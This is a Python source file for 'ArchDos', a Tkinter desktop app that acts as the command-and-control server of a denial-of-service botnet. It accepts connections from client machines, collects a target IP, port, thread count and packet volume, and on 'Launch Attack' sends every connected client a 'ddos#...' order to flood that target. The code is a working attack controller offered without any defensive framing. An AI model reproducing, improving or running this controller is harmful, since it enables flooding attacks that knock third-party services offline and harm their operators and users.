import socket
import threading
import time
from ctypes import windll
from os import system
from tkinter import *
from tkinter import ttk
attack = False
attack_target = ""
LGRAY = '#3e4042'
DGRAY = '#25292e'
RGRAY = '#10121f'
win= Tk()
win.wait_visibility()
win.title('ArchDos')
win.overrideredirect(True)
win.geometry('600x400+200+200')
win['background']='#25292e'
title_bar = Frame(win, bg=DGRAY, relief='flat', bd=0,highlightthickness=0)#RGRAY
win.minimized = False
server_address = ('',0)
def set_appwindow(mainWindow):
    GWL_EXSTYLE = -20
    WS_EX_APPWINDOW = 0x00040000
    WS_EX_TOOLWINDOW = 0x00000080
    # Magic
    hwnd = windll.user32.GetParent(mainWindow.winfo_id())
    stylew = windll.user32.GetWindowLongW(hwnd, GWL_EXSTYLE)
    stylew = stylew & ~WS_EX_TOOLWINDOW
    stylew = stylew | WS_EX_APPWINDOW
    res = windll.user32.SetWindowLongW(hwnd, GWL_EXSTYLE, stylew)
   
    mainWindow.wm_withdraw()
    mainWindow.after(10, lambda: mainWindow.wm_deiconify())
def minimize_me():
    win.attributes("-alpha",0)
    win.minimized = True       
def deminimize(event):
    win.attributes("-alpha",1)
    if win.minimized:
        win.minimized = False 
close_button = Button(title_bar, text='  ×  ', command=win.destroy,bg=DGRAY,padx=2,pady=2,font=("calibri", 13),bd=0,fg='white',highlightthickness=0)
minimize_button = Button(title_bar, text=' 🗕 ',command=minimize_me,bg=DGRAY,padx=2,pady=2,bd=0,fg='white',font=("calibri", 13),highlightthickness=0)
title_bar_title = Label(title_bar, text="MadeBy Linc.", bg=DGRAY,bd=0,fg='white',font=("helvetica", 10),highlightthickness=0)
title_bar.pack(fill=X)
close_button.pack(side=RIGHT,ipadx=7,ipady=1)
minimize_button.pack(side=RIGHT,ipadx=7,ipady=1)
title_bar_title.pack(side=LEFT, padx=10)
def changex_on_hovering(event):
    global close_button
    close_button['bg']='red'   
def returnx_to_normalstate(event):
    global close_button
    close_button['bg']=DGRAY
def changem_size_on_hovering(event):
    global minimize_button
    minimize_button['bg']=LGRAY
def returnm_size_on_hovering(event):
    global minimize_button
    minimize_button['bg']=DGRAY
def get_pos(event):
        xwin = win.winfo_x()
        ywin = win.winfo_y()
        startx = event.x_root
        starty = event.y_root
        ywin = ywin - starty
        xwin = xwin - startx
        def move_window(event):
            win.config(cursor="fleur")
            win.geometry(f'+{event.x_root + xwin}+{event.y_root + ywin}')
        def release_window(event):
            win.config(cursor="arrow")  
        title_bar.bind('<B1-Motion>', move_window)
        title_bar.bind('<ButtonRelease-1>', release_window)
        title_bar_title.bind('<B1-Motion>', move_window)
        title_bar_title.bind('<ButtonRelease-1>', release_window)
title_bar.bind('<Button-1>', get_pos)
title_bar_title.bind('<Button-1>', get_pos)
close_button.bind('<Enter>',changex_on_hovering)
close_button.bind('<Leave>',returnx_to_normalstate)
minimize_button.bind('<Enter>', changem_size_on_hovering)
minimize_button.bind('<Leave>', returnm_size_on_hovering)
win.bind("<FocusIn>",deminimize)
win.after(10, lambda: set_appwindow(win))
#---------------------------------------------------------------------------------------------------
def OBJdelete(self,time):
   self.after(time, self.destroy())
def target_ui():
    a = Frame(conn, relief='flat',bd=0, bg='#28805f')
    a.pack()
    Target_lb = Label(conn, text="Target IP:", font=("Courier 10 bold"), bg=DGRAY, fg='#00ff9d')
    Label(a, text="IP:      ", fg='#00ff9d', bg='#28805f').grid(row=0)
    Label(a, text="Port:    ", fg='#00ff9d', bg='#28805f').grid(row=1)
    Label(a, text="Thread:  ", fg='#00ff9d', bg='#28805f').grid(row=2)
    Label(a, text="Packets: ", fg='#00ff9d', bg='#28805f').grid(row=3)
    adress = Entry(a, width= 40)
    adress.grid(row=0, column=1)
    port = Entry(a, width= 40)
    port.grid(row=1, column=1)
    thread = Entry(a, width= 40)
    thread.grid(row=2, column=1)
    volume = Entry(a, width= 40)
    volume.grid(row=3, column=1)
    Atk_mode = Button(conn, text= "Launch Attack",width= 42,bd=0,fg='#00ff9d', bg='#28805f' , command=lambda:inputbox("ddos",[Atk_mode,Target_lb]))
    Atk_mode.pack(pady=10,padx=3)
    Button(conn, text= "Change Settings",width= 42,bd=0,fg='#00ff9d', bg='#28805f' , command=lambda:inputbox("INFO",[adress.get(),port.get(),thread.get(),volume.get(),Target_lb])).pack(pady=0)
    Target_lb.pack(pady=20)
def inputbox(cmd,INfO_LIST):
    global attack
    global attack_target
    if cmd == "ddos":
        attack = not attack
        switch = lambda switch: "Stop" if attack else "Start"
        INfO_LIST[0].config(text= switch(attack)+" Attack")
    elif cmd == "INFO":
        attack_target = INfO_LIST[0]+'#'+INfO_LIST[1]+'#'+INfO_LIST[2]+'#'+INfO_LIST[3]
        INfO_LIST[4].configure(text="Target ="+attack_target)
def on_new_client(clientsocket,addr):
    global attack
    global attack_target
    attacked = False
    conn_value=Label(console, text="Connected: "+str(addr[0])+' '+str(addr[1]), font=("Courier 10"), bg=DGRAY, fg='#00ff9d')
    conn_value.pack()
    message ="?"
    byt = message.encode()
    alive = True
    while alive:
        try:
            clientsocket.sendall(byt)
        except:
            OBJdelete(conn_value, 300)
            alive = False
        if attack and not attacked:
            msg = "ddos#"+attack_target
            clientsocket.sendall(msg.encode())
            # print("\n user",addr,"is starting attack")
            attacked = True
        elif not attack and attacked:
            attacked = False
        time.sleep(10)
    # clientsocket.close()
def main(server_address):
    INFO=Label(console, text="", bg=DGRAY, fg='#00ff9d', font=("Courier 10"))
    INFO.pack() 
    try:
        s = socket.socket()
        # host = socket.gethostname()
        s.bind(server_address)
        s.listen(5)
        INFO.configure(text="Waiting for clients...")
        target_ui()
        while True:
           c, addr = s.accept()
           # print ('\n Got a new connection from', addr)
           thread = threading.Thread(target=on_new_client , args=(c,addr,))
           thread.start()
        s.close()
    except Exception as e:
        INFO.configure(text=e)
        request_connection_info()
def getServerAdressFromInput(eCID,sv_con):
    global server_address
    try:
        server_address = tuple(eCID.get().split('#'))
        server_address = (server_address[0], int(server_address[1]))
        CID.configure(text="Connected to ip:"+str(server_address[0])+" port: "+str(server_address[1]), font=("Courier 15"))
        OBJdelete(eCID,300)
        OBJdelete(sv_con,300)
        threading.Thread(target=main, args=(server_address,)).start() 
        # main(server_address)
    except:
        CID.configure(text="error Connecting", font=("Courier 20"))

def request_connection_info():
    eCID = Entry(console, width= 40)
    eCID.focus_set()
    eCID.pack()
    sv_con = Button(console, text= "Validate",width= 20, bd=0, bg='#28805f', fg='#00ff9d', command=lambda:getServerAdressFromInput(eCID,sv_con))
    sv_con.pack(pady=20)
conn = Frame(win, relief='flat',bd=0,bg=DGRAY)
console = Frame(win, relief='flat',bd=0,bg=DGRAY, width=600, height=200)
console.place(anchor='center', relx=0.5, rely=0.5)
conn.pack()
console.pack()
# console.grid(row=0, column=0, sticky="")
Label(conn, text="ArchDos", bg=DGRAY, fg='#00ff9d', font=("Courier 20 bold")).pack()
CID=Label(conn, text="Server#port : ", bg=DGRAY, fg='#00ff9d', font=("Courier 10"))
CID.pack()
win.after(0, request_connection_info)
win.mainloop()
